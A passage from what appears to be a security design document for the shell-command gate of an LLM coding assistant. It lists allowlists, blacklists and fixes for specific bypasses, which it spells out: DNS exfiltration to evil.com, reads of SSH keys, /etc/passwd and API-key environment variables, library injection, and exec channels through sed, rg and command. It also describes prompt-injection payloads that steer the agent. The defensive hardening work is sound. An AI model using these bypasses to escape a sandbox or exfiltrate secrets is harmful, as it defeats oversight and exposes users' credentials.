- **3 semantic tables** (round-67, see §5.1.1): **METADATA** (`ls` / `ps` / `df` / `uname` etc., pure metadata, always allowed), **STREAM_TRANSFORMERS** (`head` / `sort` / `grep` / `awk` etc., always allowed in non-first pipeline positions; first position allowed with no file arg or a file under `~/.kaya/`), **FILE_READERS** (`cat` / `xxd` / `strings` / `base64` etc., only allowed when the file is under `~/.kaya/`). `cat` / `xxd` / `strings` / `base64` are **conditionally allowed** under `~/.kaya/` (trusted_read), not unconditionally blacklisted. **v2.1.10 review C1 tightening**: `source` was removed from FILE_READERS — `source <file>` *executes* the file rather than reading it, and combined with trusted download it formed a no-confirmation RCE chain; it now always falls to allowlist-miss deny (the `. file` form stays blocked by the dot-source blacklist). **2026-10-08 hardening (the CVE-2025-55284 class of channel)**: `ping` / `traceroute` / `nslookup` / `dig` / `host` were removed from METADATA — these 5 DNS/network diagnostic commands were previously allowed unconditionally (arguments unexamined), and an injected payload could encode context data into DNS subdomains (`dig <base64>.evil.com`) for exfiltration; the scrubber is regex-based, so base64-encoded secrets can slip past it into the context and then out through these commands. After Anthropic's CVE-2025-55284, Claude Code moved the same class of tools out of its default allowlist. Network diagnostics are not part of the LLM's capability surface (kaya is a coding assistant); removal means they all fall to `[policy:allowlist-miss]` deny (fail-closed — exactly the intended semantics). Neighboring legitimate commands (`netstat` / `ss` / `route` etc.) are unaffected, with regression tests locked for all three OS flavors.
- **Permanent blacklist** (never allowed, deny prefix `[policy:blacklist]`): shell escape / `eval` / `exec` / `xargs` / `curl` (outside trusted_download) / `wget` / `nc` / `env` / `printenv` / `set` / `export` / `pbcopy` / `screencapture` / `open` / `history` / etc. **Attribution note**: `rm` / `sudo` are denied by the safety layer's DANGEROUS patterns (`[safety:dangerous]`), `osascript` by the safety layer's OPERATION patterns (`[safety:operation]`), and `tee` — after round-67 removed it from STREAM_TRANSFORMERS — falls into `[policy:allowlist-miss]`; none of these four live in the policy-layer permanent blacklist.
- **Pipeline-segment awareness**: In `du | sort | head`, `sort` / `head` in
  non-first positions are "pure byte-stream transformers" and **do not** trigger
  the content-read blacklist. **2026-08-20 review C2 tightening**: a pipeline
  consumer with an **explicit file-path argument** (`ls | head -100
  ~/.ssh/id_rsa`) is no longer a pure stdin transform and is demoted to
  trusted-read semantics — the path must be under `~/.kaya/` or it is denied
  with `[policy:trusted-read-miss]`; only the path-less form keeps the
  unconditional skip. **C2 false-positive regression fix (same-day re-review)**:
  `tr` accepts no file operands (both GNU and BSD report extra operand; SET is
  a character set, not a path) and is always allowed as stdin-only; the spaced
  forms of value-taking flags of `cut` / `sort` / `uniq` (`cut -d ':'` /
  `sort -t ':'` / `uniq -f 2`) no longer have their values misread as paths
  (both sides' VALUE_FLAGS tables amended in sync). **2026-08-20 review C1
  tightening**: `--name=value` inline (`sed --expression=p file`) and glued
  short options (`-eSCRIPT` / `-n5`) are recognized as value-taking flags and
  no longer skipped as ordinary flags — otherwise the file operand right after
  them would be misread as the script/pattern, the path set would be drained
  empty, and the "stdin-only allow" branch would make any file's content
  readable. Both sides (Rust `policy.rs` ↔ TS `runShellPolicy.ts`) fixed in
  sync + regression tests.
- **Trusted Read sub-stage** (2026-06-17, see `2026-06-17-trusted-read-root-design.md`):
  If the path args normalize to under `~/.kaya/`, allow `cat` / `head` / `tail` /
  `grep` / `bat` / `sed -n` (`view` was removed from this list on
  2026-10-04: it is `vim -R`, an interactive editor — the safety layer's REPL
  deny blocks the whole family, and with no TTY under run_shell it would hang
  and burn the tool budget; `less` / `more` are likewise not in the allow list —
  they stay in policy's FILE_READERS table only for path-shape parsing, and the
  safety REPL gate denies them at execution, consistent with the gate order
  documented here; the `awk` / `gawk` / `mawk` / `nawk` family is likewise
  REPL-denied in whole (defense against in-program `>` file writes) and stays in
  STREAM_TRANSFORMERS only for path-shape parsing — removed from this list in
  the 2026-10-06 review); writes are split by type:
  `sed -i` / `tee` / `mv` / `rm` are **still blocked entirely**; since
  round-68 (2026-08-05), `>` / `>>` redirects are allowed when the target
  normalizes to under `~/.kaya/` and has a safe extension (non-empty, not in
  BLOCKED_DOWNLOAD_EXTS), with `/dev/null` as an exception; `<>` is gated as
  a write, and `<` input redirects are gated by the trusted-read rules;
  since 2026-10-04, write targets under a `~/.kaya/` control-plane relative
  path are always denied — same list as trusted download, see above).
- **Default deny (allowlist-miss)**: A base command not in any of the 3 allowlist tables = reject. The LLM receives a structured error so it can retry in a different way.

- **v2.1.10 review security tightenings (H1 / H2 / M-sec-2 / M-sec-3, mirrored in Rust + TS)**:
  - **sed script commands (H1)**: in the same shape as the existing sed `w`
    (write) defense, sed script-body `r` / `R` (reads an arbitrary file into
    the output stream, e.g. `sed -n '1r /etc/passwd' ~/.kaya/x.txt`) and GNU
    sed `e` (executes a shell command) are now unconditionally denied
    (`[policy:blacklist]`, no trusted_root exception); the pipeline-position
    bypass via the pipeline-consumer skip (`ps aux | sed -n '1r ...'`) is
    closed too (Layer 1 no longer skips sed with w/r/R/e). Plain
    `sed -n '1,5p'` reads are unaffected.
  - **Windows env references (H2)**: the Windows-flavor METADATA short-circuit
    (`ls` / `Get-ChildItem` / `Write-Output` etc. passed on base match without
    inspecting arguments) used to let `ls env:` / `Get-ChildItem env:` /
    `Write-Output $env:OPENAI_API_KEY` dump environment variables (incl. API
    keys) — the env blacklist runs at Layer 7 and never saw them. Layer 2 now
    scans arguments on the Windows flavor: any token referencing the `env:`
    PSDrive or a `$env:` expansion is denied (`[policy:blacklist]`; Unix
    behavior is byte-identical; the `$env:USERPROFILE` form for trusted
    paths is a deliberately accepted false positive — use `%USERPROFILE%`).
  - **Path-less recursive search (M-sec-2)**: `grep -r <pat>` / `-R` /
    `--recursive` with no file operand recursively reads the **current working
    directory** per GNU semantics, and bare `rg` / `ag` / `ack` recurse by
    default — the empty-path branch used to allow them as stdin-only. The
    implicit `.` now goes through the trusted-root check: denied with
    `[policy:trusted-read-miss]` when cwd is outside `~/.kaya/`; pipeline
    position (`ls | grep -r x`) is handled the same way (grep -r ignores
    stdin and reads cwd), while `ls | rg x` (reads the pipe) is unaffected.
  - **Content/size oracles in METADATA (M-sec-3)**: `wc` / `md5` / `shasum` /
    `sha256sum` with file path arguments now go through the trusted-root
    check — `wc -c ~/.ssh/id_rsa` (size oracle) / `md5 <file>` (content-hash
    oracle) outside the root are denied (`[policy:trusted-read-miss]`);
    path-less stdin / pipeline uses (`du | wc -l`, `md5 -s hello`) and true
    metadata commands (`ls` / `stat`) are unaffected.

- **v2.1.10 review R2 security tightenings (C-R2-1 / H-R2-1 / H-R2-2 /
  M-R2-1 / M-R2-2 / L-R2-3, mirrored in Rust + TS)**:
  - **`command` prefix exec channel (C-R2-1, Critical)**: `command` sits in
    METADATA for the `command -v <name>` pure query, but `command <cmd>
    [args…]` is a generic exec prefix — with Layer 2 short-circuiting without
    inspecting args, `command cat /etc/passwd` / `command sh -c 'id'` /
    `command env` / `command xargs ls` all passed (equivalent to arbitrary
    command execution, also bypassing command-name blacklists like
    `\bxargs\b`). Layer 2 now special-cases base == `command`: only
    `command -v/-V <name>` pure queries are allowed; every other form is
    denied with `[policy:blacklist]` (fail-closed — no re-classification
    after stripping the prefix).
  - **sed w/r/R/e glued / no-space / relative-path gaps (H-R2-1)**: the H1
    w/r/R/e regexes are tightened again — a unified `(?:\b|[0-9$])` prefix
    position (covers the `1w /etc/x` address-glued form), the path anchor
    is **removed** from w/r/R (`1w ../.zshrc` — run_shell defaults to
    cwd=~/.kaya, so `..` reaches $HOME and chains with trusted download
    into a no-confirmation ~/.zshrc write; `w/etc/x` no-space glued form
    — all denied regardless of the target's shape), and `e` is widened to
    `\s*\S`. The safety layer gains a matching DANGEROUS backstop
    (`DANGEROUS_SED_SCRIPT_WRITE_READ_RE`, same shape as the awk
    precedent). Deliberate fail-closed false positives (pinned by tests on
    both sides): substitution texts starting with `w`/`e` right after `/`
    (`sed 's/a/e x/'`, `sed 's/wow/x/'`, `sed 's/error/ERROR/g'`); normal
    `s/foo/bar/` and `sed -n '1,5p'` are unaffected.
  - **trusted download URL host validation (H-R2-2)**: ① host numeric-form
    normalization gap — curl parses hosts with inet_aton semantics, so
    `http://127.1:8080/` (short dotted), `http://2130706433/` (decimal),
    `http://0x7f000001/` (hex) all resolve to 127.0.0.1, but only the
    standard dotted-quad form was recognized → non-standard numeric forms
    are now denied outright (fail-closed); ② private ranges are all denied:
    RFC1918 (10/8, 172.16/12, 192.168/16) + 169.254/16 + CGNAT
    (100.64/10) + unspecified + broadcast + documentation ranges + v6
    fc00::/7 (ULA) / fe80::/10 (link-local) / v4-mapped
    (`::ffff:127.0.0.1`) — harvesting internal services is SSRF too; the
    trade-off is that trusted downloads can no longer reach intranet
    addresses at all; ③ `--resolve` / `--connect-to` are removed from the
    trusted-download flag allowlist (they decouple the vetted URL host
    from the actual connection target; non-trusted curl is unaffected —
    it already falls to the network-read blacklist wholesale).
  - **Subcommand exec surface of METADATA bases (M-R2-1 + R3/R5)**: `rustup run` /
    `npm exec` / `npm dlx` / `npm run` / `npm run-script` / `npm explore` /
    `npm init|create` (equivalent to `npx create-*` — downloads the package
    and immediately runs its bin; same for pnpm) /
    `cargo run|build|test|bench|install|script` / `pip download` /
    `brew ruby` / `brew irb` are all denied (`[policy:blacklist]` —
    toolchain exec channel / package download-and-execute /
    package.json scripts / build.rs RCE / sdist build execution /
    Homebrew's embedded Ruby, respectively); since R5, any non-query yarn
    form is denied (whitelist inversion — yarn classic's bare-script
    shorthand `yarn build` is the same exec surface, and bare `yarn` means
    install), and `bun` is removed from the allowlist entirely (a JS runtime:
    `bun -e` / `bun --print` / `bun <file>` are arbitrary execution).
    The check is "any token after
    the base exactly matches the deny list" (fail-closed: a leading global
    value flag like `cargo --config x=1 build` must not fool it); pure
    query forms (`rustup show` / `npm ls` / `npm view` / `cargo --version`
    / `pip show` / `brew info`) are unaffected. Deliberate false positive:
    `brew info ruby` (a formula that happens to share the name). Windows
    note: npm is `npm.cmd`; `table_base_key` strips `.exe` but not `.cmd`,
    so `npm.cmd exec` falls to allowlist-miss (already fail-closed).
  - **xcrun / launchctl whitelist inversion (2026-10-04 review, H1)**: both
    sit in the macOS METADATA table whose short-circuit skips argument
    checks, but `xcrun <tool> [args]` executes arbitrary tools
    (`xcrun python3 -c …` / `xcrun swift` / `xcrun simctl spawn` — the
    safety recursion only checks the DANGEROUS table, which
    `open().read()` does not trip), and `launchctl submit|kickstart|setenv`
    are code-exec / global-state channels (safety's OP_LAUNCHCTL only
    covers load/unload/start/stop/bootstrap/bootout). Only pure query
    forms are now allowed: `xcrun [--sdk <name>] [--toolchain <id>]
    (--find <tool> | --show-sdk-*)` (a query flag must be present; any
    other token is denied) and `launchctl
    list|print|print-cache|print-disabled` (bare launchctl = interactive
    REPL, also denied) (`[policy:blacklist]`).
  - **Exec-flag deny table (2026-10-04 review, H2)**: flags whose value is
    a command to **execute**, same risk class as `find -exec` —
    `rg --pre <cmd>` / `--pre-glob` / `--hostname-bin` (rg forks
    `<cmd> <file>` for every input file; `rg --pre=sh foo ~/.kaya/dl.txt`
    plus a trusted download is a complete RCE chain — the flag value is
    stripped during path extraction and invisible to it), and GNU
    `sort --compress-program <cmd>`. Both spaced and inline `=` forms are
    denied, at first position and in pipelines (`[policy:blacklist]`);
    non-exec inline `=` flags (`rg --glob=*.rs` / `--max-count=5`, etc.)
    are unaffected.
  - **grep recursive-detection variants (M-R2-2)**: the grep-family
    value-flag table gains `-d` / `--directories` (a `recurse` value is
    `-r` in disguise — recognized in spaced, inline, and glued forms;
    non-`recurse` values like `-d skip` are not misjudged); long-flag
    recursive detection now follows GNU getopt_long prefix-abbreviation
    semantics (valid prefixes of `--recursive` and
    `--dereference-recursive`; the ambiguous `--r` is treated as recursive,
    fail-closed).
  - **wc `--files0-from` (L-R2-3)**: its value (FILE — a file list whose
    entries wc then reads one by one) is now collected into the path
    extraction and goes through the trusted-root check (both inline and
    spaced forms); previously it was absent from the value-flag table, so
    the inline form was skipped wholesale and the empty path set passed
    as stdin-only.

- **v3.0.7 security-review hardening batch (2026-10-08, unified fixes after a
  four-track code audit; both mirrors synchronized)**:
  - **Multi-line command segmentation (V1)**: `split_segments_for` now lists
    `\n` / `\r` as segment delimiters (no splitting inside quotes; `\r\n` is a
    single boundary), and every segment passes the complete gate independently
    — previously only `|` / `&` / `;` segmented, so `ls /bin\ncurl …` let the
    first line through via METADATA while the second line ran any command
    completely unchecked (verified exploitable on both zsh and PowerShell).
    Trade-off: the body lines of a multi-line heredoc become independent
    segments and are denied (fail-closed — the lexical layer cannot
    distinguish a heredoc body from a second command line; the single-line
    `<<EOF` form is unchanged).
  - **zsh-specific execution surfaces (V2)**: the command-substitution scan
    now also detects unquoted `=(` (zsh process substitution) and the
    glob-qualifier execution forms (`*(e:…:)` / `*(+cmd)`) — previously
    `ls =(cmd)` reached execution via the METADATA short-circuit. Unix (zsh)
    branch only; bash has no such syntax, and the Windows branch already
    denies every bare `(`.
  - **Brace-expansion escape (V3)**: an unquoted `{` / `}` appearing in a
    segment is denied with `[policy:blacklist]` — from the lexical
    normalization perspective `cat {~/.kaya/a,/etc/shells}` looks like
    relative paths, but at execution time zsh/bash expand absolute paths out
    of it and escape the trusted root. Unix flavors only (PowerShell's `{…}`
    is a scriptblock literal with no brace-expansion semantics — a blanket
    denial would kill `Where-Object { … }`); quoted braces (`awk '{print}'`)
    are unaffected.
  - **Env-prefix assignment name lookup (V4)**: when the **variable name** of
    a `VAR=value cmd` segment's leading prefix hits the dangerous table
    (`DYLD_*` / `LD_PRELOAD` / `LD_LIBRARY_PATH` / `LD_AUDIT` / `BASH_ENV` /
    `ENV` / `ZDOTDIR` / `PYTHONPATH` / `PYTHONSTARTUP` / `PYTHONINSPECT` /
    `NODE_OPTIONS` / `NODE_PATH` / `PERL5OPT` / `PERL5LIB` / `RUBYOPT` /
    `RUBYLIB` / `GIT_SSH_COMMAND` / `GIT_SSH` / `GIT_EDITOR` / `GIT_PAGER` /
    `EDITOR` / `VISUAL`, case-insensitive), it is denied — closing the
    `DYLD_INSERT_LIBRARIES=… <whitelisted command>` dynamic-library injection
    chain; the same batch extends `BLOCKED_DOWNLOAD_EXTS` with `.dylib .so
    .dll .ps1 .psm1 .psd1 .jar .scr .hta .vbs .pyw .wasm` (the redirect and
    trusted-download entries use the same caliber).
  - **Select-String unknown flags fail closed (V5, Windows)**: prefix
    abbreviations of `-LiteralPath` such as `-lit` were previously skipped as
    unknown flags, and the emptied path set then passed as stdin-only
    (arbitrary file read); now any unknown `-` flag on select-string is
    denied as trusted-read-miss (false-positiving legal valueless flags like
    `-CaseSensitive` is a deliberate trade-off — spell the flag out in full).
  - **Windows trailing space/dot (V6)**: a redirect / trusted-download target
    with a trailing space or `.` is denied outright — Windows CreateFile
    strips trailing characters, so `evil.exe ` actually writes `evil.exe`,
    bypassing the extension blacklist.
  - **Credential-directory hard denial moved up to the policy layer (V7)**:
    the list is promoted to the single source of truth
    `policy.rs::CREDENTIAL_DIR_RELS` (list_dir now references the same list)
    and extended (`.terraform.d` / `.ollama` / `.huggingface` /
    `.local/share/keyrings` / `.config/openai` / `.codex` / `.claude`);
    METADATA-table commands (`ls` / `stat` / `du` etc.) are denied with
    `[policy:trusted-read-miss]` when a path argument — or, for path-less
    forms, the cwd — hits a credential directory: previously `ls -la ~/.ssh`
    short-circuited through METADATA, bypassing the list_dir layer's
    "enumeration is information leakage" protection; `mdfind` is removed from
    the allowlist on all platforms (Spotlight searches by content across the
    whole disk, and the path gate cannot constrain its query semantics).
    **2026-10-09 review hardening**: ① `~user` forms fail closed —
    `expand_tilde` only expands `~` / `~/`, so `ls ~jack/.ssh` remained a
    literal after normalization and never matched (passing straight through,
    while zsh expands it at exec time); now `~<current-username>` (taken
    from the home basename) is normalized to home before the check, every
    other `~user` form is denied as a hit (conservatively over-denying
    `~other/Documents` — the safe direction), and an empty home basename
    (no username available) also fails closed; ② case folding — on macOS
    (APFS is case-insensitive by default) and Windows both sides are
    lowercased for the comparison (previously only the home side was
    lowercased on Windows, so the mixed-case `Library/Keychains` entry
    could never match, and on macOS the lowercase `~/library/keychains`
    form slipped through); Linux stays case-sensitive. **Known boundaries
    (deliberately out of scope)**: glob forms (`ls -d ~/.s*`) and recursive
    enumeration rooted at home itself (`find ~` / `tree ~` / `du ~`) are
    NOT covered by V7's literal matching — the lexical layer cannot expand
    wildcards, and listing the parent with `ls -la ~` is intentionally kept
    allowed; these forms only leak filenames — **content reads remain
    gated by trusted-read** (credential directories are outside the trusted
    root, so `cat` and the other FILE_READERS are always denied).
  - **IM channel turns: trusted-read sensitive-subtree denial (F3)**:
    `PolicyContext` gains `restrict_sensitive_reads` (**set to true only for
    IM channel turns** — the only production assignment site is
    `channels/inbound.rs`; remote SPA turns reuse the desktop
    `PolicyContext` and peer turns register no `run_shell`, so neither is in
    scope; honest scope note in §4.7; always false for desktop / CLI);
    trusted-read hits on the
    `memory/` / `audit/` / `conversations/` / `channels/` / `remote/` /
    `debug/` / `tmp-images/` subtrees (including recursive reads of the root
    itself) are always denied — closing the bypass where "an IM turn could
    `cat ~/.kaya/memory/**` and read the raw memories and the full session
    history" (§4.7 updated in sync; after the memory retrieval tools were
    opened to IM on 2026-10-08, this denial is the boundary that remains:
    memory content leaves only through the scrubbed memory_* tool outputs,
    never through a run_shell read of the raw files); **2026-10-09 round-2
    fix (case folding)**: on macOS (APFS, case-insensitive by default) and
    Windows the relative path is lowercased before comparison — previously
    the macOS flavor preserved the original casing, so a
    `cat ~/.kaya/Memory/**` variant bypassed this gate (verified; aligned
    with the V7 credential-dir check's ignore_case semantics), while Linux
    stays case-sensitive. Known boundaries (intentionally not on the list):
    `history/` (shell command history), `terminal/` (per-tab scrollback
    logs), and `logs/` (app_log) — reads of these still pass through output
    scrub (secret shapes are still masked), and the non-secret-shaped
    private-content exposure is tracked for a future release; the
    transcript asymmetry (`terminal/` scrollback outside the list while
    `conversations/` is on it) was recorded the same day for follow-up.
    The TS mirror takes no new parameter (the
    audit only records desktop turns, where this flag is always false).
    **Added 2026-10-26 (the cloud usage upload's local state)**: a
    trusted-read hit on `usage/upload-<deployment>.json` or its atomic-write temp file
    `usage/upload-<deployment>.json.tmp` (holding the account id, device id and
    provider dimension mapping) is denied (also **only for IM channel
    turns**) — and the **`usage/` subtree is
    judged per path, admitting only the usage event files**: the
    directory itself (an explicit-path recursive read
    `grep -r x ~/.kaya/usage`, or a bare recursive search with cwd set to
    that directory), the state files, the atomic-write temp file, the
    cross-process lock file, and every wildcard form that would match
    them (`~/.kaya/usage/*`, `upload.json*`, `upload-*.json*` — the lexical layer cannot
    expand wildcards, so blocking exact paths alone does not hold) are
    denied. The **usage event files**
    (`usage/events-YYYY-MM-DD.jsonl`, counts plus provider / model
    identifiers only) stay readable, and the `usage/` subtree is **not**
    on the sensitive-directory list; the case-folding semantics are the
    same ones (macOS / Windows lowercase, Linux case-sensitive).

**Why trusted read cannot leak**: The scrubber still runs. If the read content
contains AWS keys / API keys / PEM blocks, they continue to be redacted. The
audit trail's `ToolCallCompleted` event tags it with `stage: "trusted_read"`, and
the judge rule skips the "reader-without-redaction" check.

**Escape interception**: `..` escapes (pre-/post-normalization comparison),
prefix-similarity tricks (`kaya-other/` looks like a subdirectory of `kaya/` but
isn't) are caught server-side by tokenization + normalization + prefix checking.

### 5.1.1 Policy's 3 tables + 7 deny categories (Round-67, 2026-07-05)

The original binary allow/deny-list structure was rebuilt into **3 semantic tables + a permanent blacklist + an allowlist-miss catch-all**. The deny reason the LLM receives now carries a structured `[stage:subcategory]` prefix that maps precisely to one of the 7 categories below. The system prompt (`policy_prompt::render_allowed_section_*`) and the run_shell tool description (`tools/run_shell.rs::rules_prose`) are generated from the same data source — **single source of truth, no drift**.

| Table | Commands | Allowed when | Denied when |
|---|---|---|---|
| **METADATA** | `ls` / `ps` / `netstat` / `df` / `wc` / `find` / `uname` / `whoami` / `date` etc. | always | never (exceptions since the v2.1.10 review: `wc` / `md5` / `shasum` / `sha256sum` with an out-of-root file path arg are denied as trusted-read-miss — content/size oracles; on the Windows flavor, args referencing `env:` / `$env:` are denied — env dump; since R2: `command` only allows the `-v/-V <name>` pure query, and the `rustup run` / `npm exec\|dlx\|run\|run-script\|explore\|init\|create` (same for pnpm) / non-query `yarn` (whitelist inversion — yarn classic's bare-script shorthand `yarn build` included, bare `yarn` means install) / `cargo run\|build\|test\|bench\|install\|script` / `pip download` / `brew ruby\|irb` subcommand exec surface is denied with [policy:blacklist]; `bun` is removed from the allowlist entirely (R5 — a JS runtime: `bun -e` / `bun --print` / `bun <file>` are arbitrary execution, aligned with node/python/deno → allowlist-miss); since 2026-10-04: `xcrun` only allows the `--find` / `--show-sdk-*` pure queries and `launchctl` only allows `list\|print\|print-cache\|print-disabled` (whitelist inversion, all other forms denied with [policy:blacklist]); `systemctl` only allows pure-query verbs such as `status\|show\|cat\|is-*\|list-*\|get-default\|show-environment` (same whitelist inversion — `edit` / `set-environment` / `link` / `preset` / `daemon-reload` / bare invocations are all denied; known boundary: `-H/--host` ssh-es to the given host and `show-environment` reads PID1's environment — recorded here)) |
| **STREAM_TRANSFORMERS** | `head` / `tail` / `sort` / `grep` / `awk` / `sed` / `cut` / `tr` / `uniq` etc. | non-first position with no explicit path arg always (since 2026-08-20: a pipeline-position entry with an explicit path arg is gated by trusted-read; `tr` excepted — it accepts no file operands and is always stdin-only); first position with no file arg; first position + file under `~/.kaya/` | first position + file outside `~/.kaya/`; pipeline position + explicit path outside `~/.kaya/`; `sed -i` (a write) always; sed script-body `w` / `r` / `R` / `e` commands always (v2.1.10 review H1); path-less recursive searches (`grep -r`, bare `rg`) when cwd is outside the root (v2.1.10 review M-sec-2) |
| **FILE_READERS** | `cat` / `bat` / `view` / `less` / `more` / `xxd` / `hexdump` / `od` / `strings` / `base64` / `base32` (`source` removed in v2.1.10 review C1 — it executes rather than reads; always allowlist-miss) | file arg under `~/.kaya/` | file outside `~/.kaya/` |
| **Permanent blacklist** | shell escape / `eval` / `exec` / `xargs` / `curl` / `wget` / `nc` / `env` / `printenv` / `set` / `export` / `pbcopy` / `screencapture` / `open` / `history` etc. (`rm`/`sudo` belong to safety DANGEROUS, `osascript` to safety OPERATION, `tee` falls into allowlist-miss — none are in this table) | never | always |

**The 7 deny subcategories** (the `[stage:subcategory]` prefix):

- `[safety:dangerous]` destructive operations (`rm -rf` / `sudo` / `dd if=` / `mkfs` / `kill -9`)
- `[safety:repl]` REPL/interactive (`vim` / `view` / `less` / bare `python` / bare `node` / `irb` / `gh repl`)
- `[safety:operation]` system mutation (`npm install` / `brew install` / `systemctl` / `launchctl`)
- `[policy:blacklist]` permanent blacklist (shell escape / eval / exec / xargs / curl / wget / env dump / pbcopy / screencapture / open / history)
- `[policy:allowlist-miss]` base command not in any of the 3 allowlist tables
- `[policy:trusted-read-miss]` file reader / stream transformer with a path outside `~/.kaya/`
- `[policy:trusted-download-miss]` `curl -o` target outside `~/.kaya/` or unsafe extension (`.sh` / `.py` / `.exe` / `.dmg` / binary / installer)

**Privacy-surface analysis**: this change **does not widen the leak surface**. Legitimate stream-filter behavior like `ps aux | grep nginx`, which under the old model relied on the implicit "PIPELINE_CONSUMERS skip the blacklist" rule, is under the new model promoted from the blacklist to the non-first position of STREAM_TRANSFORMERS — **explicitly** legal. Likewise, sed `-n` (read-only) is allowed by the table, while sed `-i` (a write) is explicitly denied.

**Rust ↔ TS sync**: `src/lib/runShellPolicy.ts` and `src/lib/safety.ts` are mirrors the audit judge uses for deterministic replay — any addition/removal of table entries on the Rust side must be synchronized to the TS side **in the same PR**, otherwise audit-judge Pass 1 will report `decision-mismatch` / `stage-mismatch` for every recorded session. See `docs/superpowers/specs/2026-07-05-policy-llm-alignment-design.md`.

**Bilingual deny text (localization Phase R4, 2026-10-06)**: the descriptions of the 7 deny categories and the human-readable labels of the three safety tables (DANGEROUS / REPL / OPERATION) exist in zh/en pairs — `DENY_CATEGORIES` / `DENY_CATEGORIES_EN` (policy.rs; the zh table is byte-frozen), safety.rs's `SafetyLabel = (zh, en)` label pairs, and `SafetyOptions.locale` (default zh). The deny reason is rendered in the turn's UI language (threaded via run_shell `execute`'s `locale`); the structured `[stage:subcategory]` prefix and all gate decision logic are identical across languages — only the human-readable part switches. zh output is byte-identical to pre-R4 (audit anchors / golden tests unaffected). The run_shell tool description's framing prose (`framing_prose`) is bilingual too. On the audit-judge replay side (the TS mirrors), the default locale follows the current UI locale (same source as Rust's `ChatOptions.locale`), so replay matches the recording on the same machine and language; known boundary: if the UI language is switched between recording and replay, the human part of safety reasons crosses languages and `normalizeReason` (which only strips the prefix) reports `reason-mismatch` — decision / stage comparisons are unaffected. A second known boundary (pre-existing, noted in the 2026-10-06 review): the Rust and TS tables do not list entries in exactly the same order, so when one command hits multiple rules the two sides join reasons in different orders and `normalizeReason` (which strips only the first prefix before comparing whole strings) may report `reason-mismatch` — again without affecting decision / stage comparisons. TS mirrors are structurally identical: `DENY_CATEGORIES_EN` (runShellPolicy.ts) and `{ zh, en }` label pairs in safety.ts, with prefix parity locked by tests on both sides.

### 5.2 Safety (dangerous-command detection)

Source: `crates/kaya-core/src/llm/safety.rs` (test count tracked in §11.1, three
sets of regex)

- **DANGEROUS**: `rm -rf` / disk / direct device writes / `dd if=` / `mkfs` / etc.;
  since 2026-10-04 this includes the `where-object` scriptblock backstop —
  Windows `where-object` sits in STREAM_TRANSFORMERS (pipeline-position args
  go unchecked), but its `{...}` block is an arbitrary-PowerShell exec
  surface. Plain filter usage stays allowed; only dangerous literals inside
  the block are denied — file reads (`ReadAllText` / `Get-Content` /
  `[IO.File]`), code execution (`Invoke-*` / `iex` / `Start-Process`), and
  network exfiltration (`curl` / `DownloadString`, etc.)
  (`[safety:dangerous]`, covering the `where-object` / `where` / `?` alias
  forms; the scan window runs from `{` to the next `|` or end of string,
  deliberately crossing `}` so nested scriptblocks cannot truncate it
  (2026-10-04 independent review I1), while legitimate cmdlets after the
  `|` are unaffected; known residual: an inner pipeline inside the block
  truncates the window — shallow literal scanning is meant to raise the
  cost of injection, not to be a complete parser)
- **REPL**: Bare invocations of `vim` / `view` / `less` / `python` / `node` / `irb` (which
  enter interactive mode)
- **OPERATION**: `sudo` / `brew install` / `kill` / `launchctl` /
  `diskutil eraseDisk` / etc.
- **Recursive depth 3**: Inner bodies of heredoc / `$(...)` / `` `...` `` /
  `eval` / `bash -c` are also scanned, to prevent "the LLM synthesizes a script
  and stuffs it into a heredoc for you to execute".
- **Default deny**: Not matching the whitelist = reject.

**Commands you type directly into the terminal do not pass through these two
gates** — you are responsible for your own shell behavior. This is a design
decision, not a vulnerability: typing `rm -rf` is not blocked, typing `kill` is
not blocked. We **do not** make that decision for you.

### 5.3 Windows Semantics Layer (Windows port Phase 1b, 2026-08-24)

On Windows the `run_shell` subprocess is PowerShell (Phase 1d), and Windows
PowerShell / pwsh ship with many Unix-style aliases (`cat` → Get-Content,
`ls` → Get-ChildItem, `rm` → Remove-Item, etc.), so **Unix command names still
execute on Windows**; conversely, dangerous Windows cmdlets do not exist on
Unix, and matching them there is harmless. Accordingly:

- **The three tables**: "Unix table as-is + Windows additions as a union".
  `OsFlavor` gains a `Windows` variant; `allowed_bases_for(flavor)` /
  `stream_transformers_for(flavor)` / `file_readers_for(flavor)` build per
  flavor (Macos → CORE ∪ MACOS_EXTRA; Windows → (CORE − `type` − `find`) ∪
  WINDOWS_EXTRA; Linux → CORE). **The `type` exception**: a pure metadata
  builtin on Unix, but a `Get-Content` alias (reads files) in pwsh — on
  Windows it is removed from METADATA and moved into FILE_READERS. **The
  `find` exception** (2026-08-24 review): a structural query on Unix, but
  find.exe on Windows has **grep semantics (reads file content)** — on
  Windows it is removed from METADATA and falls to allowlist-miss (the
  pwsh-correct `Select-String` is already in the stream-transformer table);
  `find` on macOS / Linux is unchanged. Windows additions: METADATA gains
  `where` / `tasklist` / `ipconfig` / `systeminfo` / `Get-Process` /
  `Get-ChildItem` / `Get-Location` and other read-only cmdlets;
  STREAM_TRANSFORMERS gains `Select-Object` / `Sort-Object` /
  `Select-String` / `Where-Object` / `Compare-Object` (**not**
  `ForEach-Object` — scriptblock code execution; **not** `Tee-Object` — the
  same T-junction disk write as tee); FILE_READERS gains `Get-Content` /
  `type` / `Format-Hex`. 2026-10-12 practicality revision: METADATA drops
  `Get-Volume` / `Get-Host` / `Write-Output` (no real use — they now fall to
  allowlist-miss) and gains `dir` / `gci` / `Get-FileHash` / `Get-Service` /
  `Get-PSDrive` / `Get-Member` (all read-only);
  STREAM_TRANSFORMERS gains `findstr` / `sls` / `select`; FILE_READERS gains
  `gc` (a Get-Content alias); and
  **TRUSTED_READ_BASES gains `Select-String` / `sls` / `findstr`** — previously
  they only worked in pipeline position, while first-position forms
  (`Select-String -Path f -Pattern p` / `findstr "p" f`) fell to
  allowlist-miss; the three commands do not exist on Unix, so the addition is
  inert there. findstr's file-reading `/g:` `/d:` flags get a dedicated
  path-extraction arm (unknown `/` flags fail closed — same philosophy as the
  Select-String V5 fix).
  **2026-10-12 release-review hardening (list-form escape)**: PowerShell
  comma arrays (`-Path a,b` / `gc a,b` read multiple files) and findstr's
  semicolon-separated `/d:` directory list are no longer gated as a single
  whole-token path — the value is split per element and every element goes
  through normalization + the trusted-root prefix check independently (any
  element outside the root denies; empty elements fail closed; the comma
  split applies only to Windows-only file-reader cmdlets — Unix bases are
  never split because commas are legal in Unix file names). findstr
  `/f:file` (read the file list from a file) is now denied outright — the
  bytes actually read are whatever paths the list names, so vetting only the
  list file itself is a transitive arbitrary-file read (precedent: sed
  `r`/`R` are denied the same way). TS mirror updated in the same batch.
  **Same-day round-2 follow-up on the same shape**: pwsh built-in aliases
